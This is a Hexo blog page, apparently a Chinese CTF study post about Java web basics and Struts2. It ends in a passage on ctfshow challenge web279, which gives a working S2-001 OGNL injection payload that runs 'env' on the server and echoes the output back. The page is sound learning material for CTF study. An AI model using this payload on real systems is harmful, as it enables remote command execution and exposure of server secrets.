@@ -1,0 +1,653 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Java入门笔记Java从源代码到运行Java源代码.java首先会通过Java编译器：javac编译为Java字节码(.class或.jar)。 之后，Java虚拟机：JVM可执行.class字节码文件。 类从被加载至虚拟机内存到卸载出内存为止的生命周期有七个阶段：加载（Loading）、验证（Verification）、准备（Preparation）、解析（Resolution）、初始化（In">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow-web入门笔记-Java入门">
+<meta property="og:url" content="http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-Java%E5%85%A5%E9%97%A8/index.html">
+<meta property="og:site_name" content="ShuiChang厕纸博客站">
+<meta property="og:description" content="Java入门笔记Java从源代码到运行Java源代码.java首先会通过Java编译器：javac编译为Java字节码(.class或.jar)。 之后，Java虚拟机：JVM可执行.class字节码文件。 类从被加载至虚拟机内存到卸载出内存为止的生命周期有七个阶段：加载（Loading）、验证（Verification）、准备（Preparation）、解析（Resolution）、初始化（In">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-05-04T16:17:49.000Z">
+<meta property="article:modified_time" content="2024-05-04T16:18:04.132Z">
+<meta property="article:author" content="ShuiChang">
+<meta property="article:tag" content="web学习">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ctfshow-web入门笔记-Java入门</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xss%E5%85%A5%E9%97%A8/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-SQL%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-Java%E5%85%A5%E9%97%A8/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-Java%E5%85%A5%E9%97%A8/&text=ctfshow-web入门笔记-Java入门"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-Java%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-Java入门"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-Java%E5%85%A5%E9%97%A8/&is_video=false&description=ctfshow-web入门笔记-Java入门"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow-web入门笔记-Java入门&body=Check out this article: http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-Java%E5%85%A5%E9%97%A8/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-Java%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-Java入门"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-Java%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-Java入门"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-Java%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-Java入门"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-Java%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-Java入门"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-Java%E5%85%A5%E9%97%A8/&name=ctfshow-web入门笔记-Java入门&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-Java%E5%85%A5%E9%97%A8/&t=ctfshow-web入门笔记-Java入门"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">Java入门笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Java%E4%BB%8E%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%B0%E8%BF%90%E8%A1%8C"><span class="toc-number">1.1.</span> <span class="toc-text">Java从源代码到运行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84Java-Web%E6%A1%86%E6%9E%B6"><span class="toc-number">1.2.</span> <span class="toc-text">常见的Java Web框架</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts2-%E6%A1%86%E6%9E%B6"><span class="toc-number">1.3.</span> <span class="toc-text">Struts2 框架</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Struts2-%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84"><span class="toc-number">1.3.1.</span> <span class="toc-text">Struts2 目录结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Struts2-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91"><span class="toc-number">1.3.2.</span> <span class="toc-text">Struts2 业务逻辑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Struts2-Action%E7%B1%BB"><span class="toc-number">1.3.3.</span> <span class="toc-text">Struts2 Action类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-xml"><span class="toc-number">1.3.4.</span> <span class="toc-text">web.xml</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFServlet"><span class="toc-number">1.4.</span> <span class="toc-text">什么是Servlet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web279-S2-001"><span class="toc-number">1.5.</span> <span class="toc-text">web279 - S2-001</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ognl%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">1.5.1.</span> <span class="toc-text">Ognl表达式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web280-S2-005"><span class="toc-number">1.6.</span> <span class="toc-text">web280 - S2-005</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web281-S2-007"><span class="toc-number">1.7.</span> <span class="toc-text">web281 - S2-007</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%ADS2-007"><span class="toc-number">1.7.1.</span> <span class="toc-text">判断S2-007</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90payload"><span class="toc-number">1.7.2.</span> <span class="toc-text">解析payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-%EF%BC%9F"><span class="toc-number">1.7.3.</span> <span class="toc-text">什么是@？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E8%A7%A3%EF%BC%88Annotations%EF%BC%89"><span class="toc-number">1.7.3.1.</span> <span class="toc-text">注解（Annotations）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E4%BA%8ELambda%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">1.7.3.2.</span> <span class="toc-text">@用于Lambda表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFJava-Lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F%EF%BC%9F"><span class="toc-number">1.7.3.3.</span> <span class="toc-text">什么是Java Lambda表达式？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web282-S2-008"><span class="toc-number">1.8.</span> <span class="toc-text">web282 - S2-008</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web283-S2-009"><span class="toc-number">1.9.</span> <span class="toc-text">web283 - S2-009</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web284-S2-012"><span class="toc-number">1.10.</span> <span class="toc-text">web284 - S2-012</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web285-S2-013-S2-014"><span class="toc-number">1.11.</span> <span class="toc-text">web285 - S2-013&#x2F;S2-014</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web286-S2-015"><span class="toc-number">1.12.</span> <span class="toc-text">web286 - S2-015</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web287-S2-016"><span class="toc-number">1.13.</span> <span class="toc-text">web287 - S2-016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web288-S2-019"><span class="toc-number">1.14.</span> <span class="toc-text">web288 - S2-019</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web289-S2-032"><span class="toc-number">1.15.</span> <span class="toc-text">web289 - S2-032</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web290-S2-032"><span class="toc-number">1.16.</span> <span class="toc-text">web290 - S2-032?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web291-S2-033"><span class="toc-number">1.17.</span> <span class="toc-text">web291 - S2-033</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web292-S2-037"><span class="toc-number">1.18.</span> <span class="toc-text">web292 - S2-037</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web293-S2-045"><span class="toc-number">1.19.</span> <span class="toc-text">web293 - S2-045</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web294-S2-046"><span class="toc-number">1.20.</span> <span class="toc-text">web294 - S2-046</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web295-S2-048"><span class="toc-number">1.21.</span> <span class="toc-text">web295 - S2-048</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web296-S2-052"><span class="toc-number">1.22.</span> <span class="toc-text">web296 - S2-052</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web297-S2-053"><span class="toc-number">1.23.</span> <span class="toc-text">web297 - S2-053</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web298-%E4%B8%80%E4%B8%AAServlet"><span class="toc-number">1.24.</span> <span class="toc-text">web298 - 一个Servlet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web299"><span class="toc-number">1.25.</span> <span class="toc-text">web299</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web300-PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.26.</span> <span class="toc-text">web300 - PHP文件包含</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ctfshow-web入门笔记-Java入门
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ShuiChang</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-05-04T16:17:49.000Z" class="dt-published" itemprop="datePublished">2024-05-05</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/web%E5%AD%A6%E4%B9%A0/" rel="tag">web学习</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Java入门笔记"><a href="#Java入门笔记" class="headerlink" title="Java入门笔记"></a>Java入门笔记</h1><h2 id="Java从源代码到运行"><a href="#Java从源代码到运行" class="headerlink" title="Java从源代码到运行"></a>Java从源代码到运行</h2><p>Java源代码<code>.java</code>首先会通过Java编译器：<code>javac</code>编译为<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-cn/Java%E5%AD%97%E8%8A%82%E7%A0%81">Java字节码</a>(<code>.class</code>或<code>.jar</code>)。</p>
+<p>之后，Java虚拟机：<code>JVM</code>可执行<code>.class</code>字节码文件。</p>
+<p>类从被加载至虚拟机内存到卸载出内存为止的生命周期有<a target="_blank" rel="noopener" href="https://javaguide.cn/java/jvm/class-loading-process.html">七个阶段</a>：加载（Loading）、验证（Verification）、准备（Preparation）、解析（Resolution）、初始化（Initialization）、使用（Using）和卸载（Unloading）。其中，验证、准备和解析这三个阶段可以统称为连接（Linking）。</p>
+<h2 id="常见的Java-Web框架"><a href="#常见的Java-Web框架" class="headerlink" title="常见的Java Web框架"></a>常见的Java Web框架</h2><p>常见的<a target="_blank" rel="noopener" href="https://juejin.cn/post/6970971378413469727">Java Web框架</a>有</p>
+<ul>
+<li>Spring Framework (包括Spring MVC)</li>
+<li>Struts 2</li>
+<li>JavaServer Faces (JSF)</li>
+<li>Hibernate (ORM 框架)</li>
+<li>SpringBoot</li>
+</ul>
+<h2 id="Struts2-框架"><a href="#Struts2-框架" class="headerlink" title="Struts2 框架"></a>Struts2 框架</h2><h3 id="Struts2-目录结构"><a href="#Struts2-目录结构" class="headerlink" title="Struts2 目录结构"></a>Struts2 目录结构</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/tjzhaomengyi/article/details/51119306">Struts2 目录结构</a></p>
+<p>Apache Struts 2是一个基于MVC设计模式的Java Web框架，它的目录结构类似于其他Java Web应用程序，遵循一种标准的组织方式，以便于开发、部署和维护。以下是一个典型的Struts 2应用程序的目录结构及其用途：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">WebApp/</span><br><span class="line">├── src/</span><br><span class="line">│   ├── main/</span><br><span class="line">│   │   ├── java/</span><br><span class="line">│   │   │   └── (你的应用程序Java源代码，包括Action类)</span><br><span class="line">│   │   ├── resources/</span><br><span class="line">│   │   │   └── (应用程序资源文件，如Struts配置文件、属性文件等)</span><br><span class="line">│   │   └── webapp/</span><br><span class="line">│   │       ├── WEB-INF/</span><br><span class="line">│   │       │   ├── classes/</span><br><span class="line">│   │       │   │   └── (编译后的Java类文件)</span><br><span class="line">│   │       │   ├── lib/</span><br><span class="line">│   │       │   │   └── (应用程序依赖的JAR文件)</span><br><span class="line">│   │       │   ├── struts.xml</span><br><span class="line">│   │       │   └── web.xml</span><br><span class="line">│   │       ├── resources/</span><br><span class="line">│   │       │   └── (web资源，如CSS、JavaScript、图片等)</span><br><span class="line">│   │       └── views/</span><br><span class="line">│   │           └── (JSP或其他视图技术的页面文件)</span><br><span class="line">└── pom.xml (对于Maven项目)</span><br></pre></td></tr></table></figure>
+<p>src&#x2F;: 这是源代码的根目录，所有的Java源代码和资源文件都位于此目录下。</p>
+<p>src&#x2F;main&#x2F;java&#x2F;: 存放应用程序的Java源代码，包括Struts 2的Action类和其他业务逻辑类。</p>
+<p>src&#x2F;main&#x2F;resources&#x2F;: 存放应用程序的资源文件，如Struts配置文件(struts.xml)、国际化资源文件(messages.properties)等。</p>
+<p>src&#x2F;main&#x2F;webapp&#x2F;: 存放Web应用程序的内容，包括JSP文件、HTML文件、JavaScript、CSS、图片等。</p>
+<p>WEB-INF&#x2F;: 存放Web应用程序的配置文件和不对外直接访问的内容。</p>
+<p>classes&#x2F;: 存放编译后的Java类文件。在构建项目时，src&#x2F;main&#x2F;java&#x2F;目录下的Java源代码被编译到这里。</p>
+<p>lib&#x2F;: 存放应用程序依赖的所有JAR文件，包括Struts 2框架本身的JAR和其他第三方库。</p>
+<p>struts.xml: Struts 2的主配置文件，定义了应用程序的Action映射和其他框架配置。</p>
+<p>web.xml: Web应用程序的部署描述文件，配置了Servlet、过滤器等Web应用的核心元素。</p>
+<p>resources&#x2F;: 存放静态资源文件，如CSS样式表、JavaScript脚本、图片等。</p>
+<p>views&#x2F;: 存放视图文件，如JSP、FreeMarker等。这里定义了应用程序的用户界面。</p>
+<p>pom.xml: 如果是使用Maven构建的项目，pom.xml定义了项目的构建配置，包括项目依赖、插件、构建生命周期等。</p>
+<h3 id="Struts2-业务逻辑"><a href="#Struts2-业务逻辑" class="headerlink" title="Struts2 业务逻辑"></a>Struts2 业务逻辑</h3><p>在Struts 2框架中，业务逻辑指的是应用程序用于处理核心任务和操作的代码部分，比如数据处理、数据库操作、调用外部服务等。这部分代码通常与框架的MVC（Model-View-Controller）架构的模型（Model）层和服务层（Service Layer）相关联。业务逻辑不直接与用户界面交云，而是被控制器（在Struts 2中通常是Action类）调用，最终的处理结果可以传递给视图层进行展示。</p>
+<h3 id="Struts2-Action类"><a href="#Struts2-Action类" class="headerlink" title="Struts2 Action类"></a>Struts2 Action类</h3><p>在Struts 2框架中，Action类是MVC（Model-View-Controller）架构中的Controller部分的核心。它是处理用户请求的主要逻辑单元，负责解释用户请求，并调用后端逻辑，最后选择一个视图（通常是JSP页面）来渲染响应。在Struts 2中，Action不仅仅是一个简单的Servlet，它提供了更丰富的模型来处理Web请求。</p>
+<p>功能和责任：</p>
+<ul>
+<li><p>处理请求：Action类接收并处理来自用户的Web请求。</p>
+</li>
+<li><p>业务逻辑调用：它调用业务逻辑或服务层代码来执行具体的操作，如数据库查询、数据处理等。</p>
+</li>
+<li><p>数据封装：Action类可以封装数据，作为模型（Model）传递给视图。这些数据通常是业务逻辑执行的结果。</p>
+</li>
+<li><p>视图导航：根据执行的操作结果，Action决定应用程序的下一步跳转逻辑，即选择适当的视图来呈现给用户。</p>
+</li>
+<li><p>Struts 2的Action类通常实现Action接口或继承ActionSupport类（它本身实现了Action接口并提供了一些有用的默认实现）。ActionSupport类是最常用的基类，因为它提供了国际化、验证等附加功能。</p>
+</li>
+</ul>
+<p>在这个例子中，execute方法是Action类的主要入口点。根据Struts 2约定，当请求匹配到这个Action时，框架会调用它的execute方法。方法返回的字符串（如SUCCESS）将用来在配置文件中查找对应的视图或结果页面。</p>
+<p>Action类通常需要在Struts 2的配置文件（如struts.xml）中进行配置，以定义请求URL与Action之间的映射关系，以及Action执行结果与视图页面之间的映射关系。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.example.HelloAction&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/hello.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h3><p>web.xml文件是Java Web应用程序的部署描述符（Deployment Descriptor），它是Java EE（Enterprise Edition）规范的一部分，用于配置Web应用程序的行为。web.xml文件位于Web应用的WEB-INF目录下，描述了Servlet、过滤器（Filter）、监听器（Listener）以及其他Web应用组件的配置信息。这些信息包括Servlet的映射、欢迎文件列表、安全约束、会话配置等。</p>
+<p>web.xml文件不是Struts 2独有的。它被所有遵循Java EE规范的Web应用程序使用，包括但不限于使用Struts 2、Spring MVC、JSF等框架的应用程序。然而，在使用Struts 2框架的应用程序中，web.xml文件用于配置Struts 2的核心过滤器，这是Struts 2框架正常工作所必需的。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;GBK&quot;</span>?&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee</span></span></span><br><span class="line"><span class="string"><span class="tag">	http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span> <span class="attr">version</span>=<span class="string">&quot;3.0&quot;</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 定义Struts 2的核心Filter --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 让Struts 2的核心Filter拦截所有请求 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="什么是Servlet"><a href="#什么是Servlet" class="headerlink" title="什么是Servlet"></a>什么是Servlet</h2><p><a target="_blank" rel="noopener" href="https://www.liaoxuefeng.com/wiki/1252599548343744/1304265949708322">Servlet</a>的架构：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Web Browser &lt;---&gt; HTTP Protocol</span><br><span class="line">                        |</span><br><span class="line">                Servlets Program</span><br><span class="line">                        |</span><br><span class="line">                    Database</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46476515/article/details/129624812">深度好文之配置Servlet</a></p>
+<h2 id="web279-S2-001"><a href="#web279-S2-001" class="headerlink" title="web279 - S2-001"></a>web279 - S2-001</h2><p>点进去得到提示：“S2-001”。但我看不懂提示，于是就看<a target="_blank" rel="noopener" href="https://www.freebuf.com/column/224041.html">wp</a>。S2-001是一个Struts2的漏洞。</p>
+<p>尝试复现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: %&#123;1+1&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: 2</span><br></pre></td></tr></table></figure>
+
+<p>偷了个wp，尝试任意命令执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+<p>成功执行。</p>
+<p>解析这段payload：</p>
